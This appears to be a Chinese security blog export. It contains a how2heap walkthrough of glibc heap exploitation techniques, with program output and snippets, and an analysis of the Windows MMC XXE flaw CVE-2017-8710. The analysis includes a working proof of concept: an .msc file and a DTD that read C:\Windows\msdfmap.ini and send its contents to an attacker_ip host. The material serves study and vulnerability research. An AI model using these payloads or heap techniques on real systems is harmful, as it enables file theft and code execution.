之后再free掉&amp;fake_chunks2，那么fastbin的freeList上就会存储这&amp;fake_chunks2，之后再malloc，就是返回这个&amp;fake_chunks2地址了 poison_null_byte溢出一个空字节 123456789101112131415161718192021222324252627282930root@kali:~/learn/how2heap# ./poison_null_byte Welcome to poison null byte 2.0!Tested in Ubuntu 14.04 64bit.This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.We allocate 0x100 bytes for 'a'.a: 0x55884397e420Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108b: 0x55884397e530c: 0x55884397e740In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'b.size: 0x211b.size is: (0x200 + 0x10) | prev_in_useWe overflow 'a' with a single null byte into the metadata of 'b'b.size: 0x200c.prev_size is 0x210We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))b1: 0x55884397e530Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 210Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0We malloc 'b2', our 'victim' chunk.b2: 0x55884397e640Current b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBNow we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').Finally, we allocate 'd', overlapping 'b2'.d: 0x55884397e530Now 'd' and 'b2' overlap.New b2 content:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDThanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique. 首先申请了三个chunk a 0x100b 0x200c 0x100 之后在b+0x1f0偏移处设置0x200，以便绕过检测，使 chunksize(P) == prev_size (next_chunk(P)） 因为空字节溢出后chunksize(P) 就变为0x200 那么之后free(b)就可以成功了 之后申请了两个chunk b1 0x100b2 0x80 这两个都会覆盖原来b的位置，并将b2的内容覆盖为0x80个B，以便之后看到效果 之后free(b1),这个没什么发生，那么下一步free(c)的时候，由于c的堆结构完全没变化 所以他认为前面的chunk是空的，前面的大小是0x210，所以就跟前面0x210大小的合并 原来chunk b的地方是top chunk了 那我们再malloc 0x300,就可以获取整个一大片的内存，进而可以任意控制b2的值了 也就把BBB覆盖为DDDD了 house_of_lore欺骗malloc，通过滥用smallbin freelist来返回一个几乎任意的指针。 123456789101112131415161718192021222324252627282930313233Welcome to the House of LoreThis is a revisited version that bypass also the hardening check introduced by glibc mallocThis is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23Allocating the victim chunkAllocated the first small chunk on the heap at 0x556f56d76420stack_buffer_1 at 0x7fff28d6e1d0stack_buffer_2 at 0x7fff28d6e1b0Create a fake chunk on the stackSet the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin listSet the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()Allocated the large chunk on the heap at 0x556f56d76490Freeing the chunk 0x556f56d76420, it will be inserted in the unsorted binIn the unsorted bin the victim's fwd and bk pointers are nilvictim-&gt;fwd: (nil)victim-&gt;bk: (nil)Now performing a malloc that can't be handled by the UnsortedBin, nor the small binThis means that the chunk 0x556f56d76420 will be inserted in front of the SmallBinThe chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x556f56d76880The victim chunk has been sorted and its fwd and bk pointers updatedvictim-&gt;fwd: 0x7f82610e8bb8victim-&gt;bk: 0x7f82610e8bb8Now emulating a vulnerability that can overwrite the victim-&gt;bk pointerNow allocating a chunk with size equal to the first one freedThis should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointerThis last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bkp4 = malloc(100)The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f82610e8bb8p4 is 0x7fff28d6e1e0 and should be on the stack! 先申请一个0x100的chunk 之后在栈上伪造两个chunk stack_buffer_1的fd指向那victim——0x100的chunk，bk指向stack_buffer_2，而stack_buffer_2的fd指向stack_buffer_1 12345bck = victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd != victim))&#123; errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout;&#125; 因为这样可以绕过smallbin check 之后申请一个large chunk避免free的时候合并到top chunk去了 1void *p5 = malloc(1000); 之后free掉 victim，就放到unsortbin list去了 1free((void*)victim); 现在它的前向指针和后向指针都是null 之后申请了一个UnsortedBin和small bin都不能处理的大小 1void *p2 = malloc(1200); 查找UnsortedBin的过程中，就把victim放回small bin了 之后我们改变victim的bk，再申请一个同样是0x100大小的chunk，那么就申请到了victim的位置，当然栈地址就写到了small bin list了， 最后我们再去申请一个0x100的chunk，返回的地址就在栈上了 之后作者给了一种利用的思路，就是直接通过返回的这个chunk指针，直接改写返回地址，从而绕过canary overlapping_chunks1堆块堆叠，就是两个或以上的堆重叠了 123456789101112131415161718192021222324252627282930313233343536373839404142This is a simple chunks overlapping problemLet's start to allocate 3 chunks on the heapThe 3 chunks have been allocated here:p1=0x558962a08420p2=0x558962a08520p3=0x558962a08620Now let's free the chunk p2The chunk p2 is now in the unsorted bin ready to serve possiblenew malloc() of its sizeNow let's simulate an overflow that can overwrite the size of thechunk freed p2.For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.We are going to set the size of chunk p2 to to 385, which gives usa region size of 376Now let's allocate another chunk with a size equal to the datasize of the chunk p2 injected sizeThis malloc will be served from the previously freed chunk thatis parked in the unsorted bin which size has been modified by usp4 has been allocated at 0x558962a08520 and ends at 0x558962a090e0p3 starts at 0x558962a08620 and ends at 0x558962a088a0p4 should overlap with p3, in this case p4 includes all p3.Now everything copied inside chunk p4 can overwrites data onchunk p3, and data written to chunk p3 can overwrite datastored in the p4 chunk.Let's run through an example. Right now, we have:p4 = XkĄ p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333q If we memset(p4, '4', 376), we have:p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444q p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444q And if we then memset(p3, '3', 80), we have:p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444q p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444q 首先申请了3个chunk，大小分别为0x100-8，0x100-8，0x80-8 内容分别用1，2，3填充 之后free chunk p2,p2就到了unsorted bin 那么之后我们伪造p2的size为0x181，这个size刚好就覆盖到p3了 之后申请了一个0x180-8大小的chunk——p4，那么我们上面伪造的大小就刚好满足要求 那么这样的p4就可以任意覆盖p3，当然使用p3也可以部分覆盖p4 overlapping_chunks_2123456789101112131415161718192021222324252627282930313233343536373839This is a simple chunks overlapping problemThis is also referenced as Nonadjacent Free Chunk Consolidation AttackLet's start to allocate 5 chunks on the heap:chunk p1 from 0x55c53555f420 to 0x55c53555f808chunk p2 from 0x55c53555f810 to 0x55c53555fbf8chunk p3 from 0x55c53555fc00 to 0x55c53555ffe8chunk p4 from 0x55c53555fff0 to 0x55c5355603d8chunk p5 from 0x55c5355603e0 to 0x55c5355607c8Let's free the chunk p4.In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2with the size of chunk_p2 + size of chunk_p3Now during the free() operation on p2, the allocator is fooled to think that the nextchunk is p4 ( since p2 + size_p2 now point to p4 ) This operation will basically create a big free chunk that wrongly includes p3Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunkOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and we can overwrite data in p3 by writing on chunk p6chunk p6 from 0x55c53555f810 to 0x55c53555ffe8chunk p3 from 0x55c53555fc00 to 0x55c53555ffe8Data inside chunk p3: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCLet's write something inside p6Data inside chunk p3: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC 首先申请5个1000大小的chunk，p1到p5 之后分别用A，B，C，D，E，F填充 free p4 之后改写p2的size为p2+p3的真实大小+0x10+prev_in_use（1） 其中0x10是两个堆的size的大小 再 free掉p2，它就以为p2的下一个是p4了 我们再malloc一个2000大小的——p6，那么p6跟p3就重叠了，可以互相修改 house_of_force这个是覆盖top chunk从而使malloc返回的值能够控制 123456789101112131415161718192021222324252627282930313233343536Welcome to the House of ForceThe idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.In the end, we will use this to overwrite a variable at 0x5636c2d20060.Its current value is: This is a string that we want to overwrite.Let's allocate the first chunk, taking space from the wilderness.The chunk of 256 bytes has been allocated at 0x5636c35b2420.Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.Real size (aligned and all that jazz) of our allocated chunk is 264.Now let's emulate a vulnerability that can overwrite the header of the Top ChunkThe top chunk starts at 0x5636c35b2528Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.Old size of top chunk 0x20ae1New size of top chunk 0xffffffffffffffffThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.Next, we will allocate a chunk that will get us right up against the desired region (with an integeroverflow) and will then be able to allocate a chunk right over the desired region.The value we want to write to at 0x5636c2d20060, and the top chunk is at 0x5636c35b2528, so accounting for the header size,we will malloc 0xffffffffff76db28 bytes.As expected, the new pointer is at the same place as the old top chunk: 0x5636c35b2530Now, the next chunk we overwrite will point at our target buffer.malloc(100) =&gt; 0x5636c2d20060!Now, we can finally overwrite that value:... old string: This is a string that we want to overwrite.... doing strcpy overwrite with \"YEAH!!!\"...... new string: YEAH!! 先申请了256个字节的chunk，那么就有这个chunk和top chunk了 之后将top chunk的size改为0xffffffffffffffff，这样我们malloc很大的值也不用mmap了 之后申请一个0xffffffffff76db28byte的，这是一个负数，所以top chunk的大小会减去这么一个值，但是第一次申请的时候malloc还是返回原理top chunk的位置 那么当我们再次申请的时候，top chunk就返回了我们想要的地址了 那个负数是怎么得来的呢？ 因为我们malloc之后，top指针会加上我们的size，所以我们只需要malloc我们想要的地址跟top指针的差别再减0x10的头部就行了 unsorted_bin_attack123456789101112131415This file demonstrates unsorted bin attack by write a large unsigned long value into stackIn practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attackLet's first look at the target we want to rewrite on stack:0x7ffd0cdf2c90: 0Now, we allocate first normal chunk on the heap at: 0x556217e0e420And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7fa01c57cb58Now emulating a vulnerability that can overwrite the victim-&gt;bk pointerAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffd0cdf2c80Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:0x7ffd0cdf2c90: 0x7fa01c57cb58 作者说通常unsorted_bin_attack是为进一步利用做准备的，比如libc中的全局变量global_max_fast，之后再执行fastbin attack 给出的例子的话是覆盖栈上的局部变量 首先申请两个chunk，为的是避免free之后合并到top chunk了 跟着我们free掉第一个，那么他就会放到unsorted bin中，而此时我们的chunk有了fd和bk指针 假如我们可以有漏洞去覆盖bk，例子是覆盖栈变量指针减0x10的地址，那么结构如下 unsort bin ——&gt; p ——&gt; stack 那么我们再malloc一次，那么stack的fd就会被修改为unsort bin的头，这样就能让p脱链 house_of_einherjar123456789101112131415161718192021222324252627282930313233343536373839Welcome to House of Einherjar!Tested in Ubuntu 16.04 64bit.This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.We allocate 0x38 bytes for 'a'a: 0x558424b51420Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38We create a fake chunk wherever we want, in this case we'll create the chunk on the stackHowever, you can also create the chunk in the heap or the bss, as long as you know its addressWe set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks(although we could do the unsafe unlink technique here in some scenarios)Our fake chunk at 0x7fffc6178c70 looks like:prev_size (not used): 0x100size: 0x100fwd: 0x7fffc6178c70bck: 0x7fffc6178c70fwd_nextsize: 0x7fffc6178c70bck_nextsize: 0x7fffc6178c70We allocate 0xf8 bytes for 'b'.b: 0x558424b51460b.size: 0x101b.size is: (0x100) | prev_inuse = 0x101We overflow 'a' with a single null byte into the metadata of 'b'b.size: 0x100This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bitIf it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunkWe write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunkOur fake prev_size will be 0x558424b51450 - 0x7fffc6178c70 = 0xffffd5845e9d87e0Modify fake chunk's size to reflect b's new prev_sizeNow we free b and this will consolidate with our fake chunk since b prev_inuse is not setOur fake chunk size is now 0xffffd5845e9f9391 (b.size + fake_prev_size)Now we can call malloc() and it will begin in our fake chunkNext malloc(0x200) is at 0x7fffc6178c80 这个可以用于有off by one的程序，从而让我们有机会修改prev_inuse 首先申请0x38个byte——chunk a，这个是为off by one做准备的，之后这样我们才有机会溢出下一个chunk的头部 之后在栈上伪造了一个fake chunk（当然实际的时候我们在heap或者bss上伪造也行，只要知道地址），fd和bk都指向自己 之后申请0xf8大小的chunk——chunk b， 我们通过a一个空字节溢出b，那么b的prev_inuse bit就置0，以为前面的chunk是空闲的了 之后我们再修改b的prev size，那么最终就会控制合并后的地址了 因为合并的时候，是先找前一个chunk在哪，我们让它计算的时候找到栈上去了 所以最后再malloc，就会返回我们想要的栈地址了 house_of_orange1The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer 这个技术是利用溢出，去破坏_IO_list_all指针，需要泄露heap跟libc top chunk一般最开始是0x21000大小的 首先申请0x400-16，那么top chunk就从最开始的0x21000，剩余0x20c00，当然有PREV_INUSE标志位就是0x20c01 1p1 = malloc(0x400-16); 之后我们将top chunk的大小改为0xc01 接下来再malloc一个比这个size大的chunk，这时候原来的top chunk就会被free到unsort bin中 这个技术是故意让堆检测到异常，之后就会调用_IO_flush_all_lockp，最后遍历_IO_list_all，找到_IO_OVERFLOW函数去掉用，这个函数是相当于虚表里面的，所以我们可以伪造一个 _IO_list_all，让他去调用system函数 伪造_IO_list_all，我们需要改写它的指针，它可以通过fd或者bk来计算出来 我们需要覆盖old top chunk满足chunk-&gt;bk-&gt;fd指向 _IO_list_all,所以我们覆盖old top chunk的bk为io_list_all - 0x10 1top[3] = io_list_all - 0x10; 之后将old top chunk的前8个字节覆盖为”/bin/sh\\x00” _IO_flush_all_lockp会遍历_IO_list_all中的文件指针，因为我们只能用main_arena的unsorted -bin- list覆盖这个地址，所以这个想法是为了控制在相应的fd - ptr上的内存。下一个文件指针的地址位于base_address 0x68。这相当于smallbin4 再将old top chunk的size设置为0x61,将其强制转换为_IO_FILE指针 Set mode to 0: fp-&gt;_mode &lt;= 0 Set write_base to 2 and write_ptr to fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 12fp-&gt;_IO_write_base = (char *) 2; // top+0x20fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28 Finally set the jump table to controlled memory and place system there. The jump table pointer is right after the _IO_FILE struct: base_address+sizeof(_IO_FILE) = jump_table 123size_t *jump_table = &amp;top[12]; // controlled memoryjump_table[3] = (size_t) &amp;winner; //_IO_OVERFLOW 的地址*(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 将jump table覆盖 最后通过malloc触发","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"how2heap","slug":"how2heap","permalink":"https://www.giantbranch.cn/tags/how2heap/"}]},{"title":"Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析","slug":"Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析","date":"2017-09-27T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/09/27/Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析/","link":"","permalink":"https://www.giantbranch.cn/2017/09/27/Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析/","excerpt":"","text":"简介Microsoft的管理控制台没有正确地处理XML的外部实体引用导致可以信息泄露，下载目标机器的文件 CVE编号： CVE-2017-8710 影响系统 Windows 7 for 32-bit Systems Service Pack 1 Windows 7 for x64-based Systems Service Pack 1 Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for Itanium-Based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) 分析环境及工具 Windows 7 sp1windbgidawireshark 漏洞复现poc中有两个文件poc.msc和payload.dtd 利用流程：受害者打开poc.msc，触发外部实体对象解析，从攻击者服务器下载payload.dtd，再解析payload.dtd，最后以GET的方式发送file的内容到攻击者服务器 poc.msc如下： 123456&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE TLS [&lt;!ENTITY % file SYSTEM \"C:\\Windows\\msdfmap.ini\"&gt;&lt;!ENTITY % dtd SYSTEM \"http://attacker_ip:port/payload.dtd\"&gt;%dtd;]&gt;&lt;pwn&gt;&amp;send;&lt;/pwn&gt; payload.dtd如下： 123&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://attacker_ip:port?%file;'&gt;\"&gt;%all; 将ip和port改为自己设定的值，并在web根目录放置payload.dtd文件即可 服务器使用python搭建一个简易服务器，payload.dtd放在当前目录即可，打开poc.msc即可收到回应（虽然报错，但是执行成功） 而服务器收到的内容正是C:\\Windows\\msdfmap.ini的内容 漏洞分析首先定位漏洞程序：打开procexp，之后双击poc.msc文件进行观察，发现启动的是mmc.exe程序 用od运行mmc.exe并附带参数，弹框后暂停程序，进行栈回溯 再向下一点也可以找到打开文件的函数 在这两个打开文件的函数下断点，实际断下来的是CAMCMultiDocTemplate::OpenDocumentFile， 之后慢慢跟，中途会出现程序跑飞了，下次下个断点步入就行，之后跟到了CXMLDocument::ScLoad函数里面，发现调用了msxml3模块里面的函数 由于od看不到符号，改用windbg，可以看到调用了Document::Load 之后调用msxml3!Document::run，就发出了tcp请求 1234560:000&gt; peax=6b3f51b0 ebx=00000000 ecx=034c3ad0 edx=0006f420 esi=034c3ad0 edi=00000000eip=6b4048c7 esp=0006f3e4 ebp=0006f418 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246msxml3!Document::_load+0x182:6b4048c7 ff5060 call dword ptr [eax+60h] ds:0023:6b3f5210=&#123;msxml3!Document::run (6b404909) 其实这里已经到达了解析执行xml里面的内容，那么出的问题就是上一层的函数 1234567891011121314151617181920210:000&gt; kvChildEBP RetAddr Args to Child 0006f3dc 6b7b48ca af5c2d94 00000000 034f3ad0 msxml3!Document::run (FPO: [Non-Fpo])0006f418 6b7e4ed4 00000000 00000000 00000000 msxml3!Document::_load+0x185 (FPO: [Non-Fpo])0006f460 6b7e4e50 001c3418 af5c2d18 00000000 msxml3!Document::load+0x3b (FPO: [Non-Fpo])*** WARNING: Unable to verify checksum for mmc.exe0006f494 0102e9fd 001cf3ba 001c3418 ac5412c5 msxml3!Document::Load+0x3c (FPO: [Non-Fpo])0006f4f8 0102dd5f 0006f52c 001c3418 00000001 mmc!CXMLDocument::ScLoad+0x109 (FPO: [Non-Fpo])0006f57c 0103e606 0006f5e4 0006f5f8 00830014 mmc!CConsoleFilePersistor::ScLoadXMLDocumentFromFile+0x174 (FPO: [Non-Fpo])0006f668 01059eeb 0006f6b8 0006fbdc 0006f6f5 mmc!CConsoleFilePersistor::ScLoadConsole+0x15d (FPO: [Non-Fpo])0006f704 01022073 0006f724 0006fbdc ac54116d mmc!CAMCDoc::ScOnOpenDocument+0x1ee (FPO: [Non-Fpo])0006f750 010210b8 0006fbdc ac541199 00000004 mmc!CAMCDoc::OnOpenDocument+0x39 (FPO: [Non-Fpo])0006f7a4 697c2d8e 0006fbdc 00000001 0006fe2c mmc!CAMCMultiDocTemplate::OpenDocumentFile+0x244 (FPO: [Non-Fpo])0006fde8 697c1666 00026c38 ac57af04 00e10b58 MFC42u!CDocManager::OpenDocumentFile+0x1ed (FPO: [Non-Fpo])0006fe10 01020429 0006fe2c ac5418dd 010f54b0 MFC42u!CWinApp::ProcessShellCommand+0x8e (FPO: [Non-Fpo])0006fee0 697bf84c 010f561c 00000001 00000000 mmc!CAMCApp::InitInstance+0x5ca (FPO: [Non-Fpo])0006fef4 0100c107 01000000 00000000 00161b22 MFC42u!AfxWinMain+0x4f (FPO: [Non-Fpo])0006ff88 762e1174 7ffdf000 0006ffd4 7757b3f5 mmc!_initterm_e+0x1b1 (FPO: [Non-Fpo])0006ff94 7757b3f5 7ffdf000 775c0baf 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])0006ffd4 7757b3c8 0103fb0e 7ffdf000 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])0006ffec 00000000 0103fb0e 7ffdf000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 在ida查看：在mmc!CAMCDoc::ScOnOpenDocument中调用了mmc!CConsoleFilePersistor::ScLoadConsole 之后在ScOnOpenDocument中直接调用了ScLoadXMLDocumentFromFile解析xml文档，对外部实体没有检测 但是我在win10下调试的时候，发现mmc根本就不打开xml文档 下面出于学习的目的，跟着xml的一个解析过程 跟踪对xml外部实体的解析过程接着就是利用GetNextToken不断循环读取xml文件中的值进行解析 12345678910111213141516171819202122232425262728293031323334353637383940414243440:000&gt; peax=0006f32c ebx=00000000 ecx=03534a30 edx=00001000 esi=03534880 edi=035348b5eip=6b4016dd esp=0006f308 ebp=0006f3a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246msxml3!XMLParser::Run+0x1dd:6b4016dd e89f000000 call msxml3!XMLStream::GetNextToken (6b401781)0:000&gt; dd esp0006f308 0006f32c 0006f338 0006f33c 0006f3400006f318 b8d8ae62 03533ad0 03533b18 000000000006f328 00000024 00000000 00000000 0006f3d40006f338 00000000 00000000 00000000 000000000006f348 00000000 00000000 00000000 000000040006f358 001bf3b8 00000001 0006f350 000000000006f368 03533ad0 03534914 035348b5 0006f3280006f378 001bf3bb 03534914 00000000 000000000:000&gt; peax=00000000 ebx=00000000 ecx=0006f340 edx=0006f338 esi=03534880 edi=035348b5eip=6b4016e2 esp=0006f318 ebp=0006f3a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246msxml3!XMLParser::Run+0x1e2:6b4016e2 8945e0 mov dword ptr [ebp-20h],eax ss:0023:0006f380=000000000:000&gt; du 03534cbc 03534cbc \"xml version=\"1.0\"?&gt;..&lt;!DOCTYPE T\"03534cfc \"LS [..&lt;!ENTITY % file SYSTEM \"C:\"03534d3c \"\\Windows\\msdfmap.ini\"&gt;..&lt;!ENTITY\"03534d7c \" % dtd SYSTEM \"http://10.8.57.15\"03534dbc \"6:6000/payload.dtd\"&gt;..%dtd;]&gt;..&lt;\"03534dfc \"pwn&gt;&amp;send;&lt;/pwn&gt;..\"0:000&gt; dd esp0006f318 b8d8ae62 03533ad0 03533b18 000000000006f328 00000024 00000004 00000000 0006f3d40006f338 03534cbc 00000003 00000000 000000000006f348 00000000 00000000 00000000 000000040006f358 001bf3b8 00000001 0006f350 000000000006f368 03533ad0 03534914 035348b5 0006f3280006f378 001bf3bb 03534914 00000000 000000000006f388 0006f318 0006f3a4 0006f3cc 6b4227190:000&gt; du 03534cbc 03534cbc \"xml version=\"1.0\"?&gt;..&lt;!DOCTYPE T\"03534cfc \"LS [..&lt;!ENTITY % file SYSTEM \"C:\"03534d3c 